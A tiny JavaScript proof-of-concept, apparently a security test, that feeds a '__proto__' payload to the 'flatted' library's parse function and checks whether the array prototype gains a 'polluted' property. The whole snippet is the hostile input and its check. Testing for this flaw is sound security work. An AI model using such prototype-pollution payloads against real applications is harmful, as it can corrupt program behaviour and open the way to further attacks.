const flatted = require('flatted');
const parsed = flatted.parse('{"__proto__": {"polluted": "pwned"}}');
console.log([].polluted);
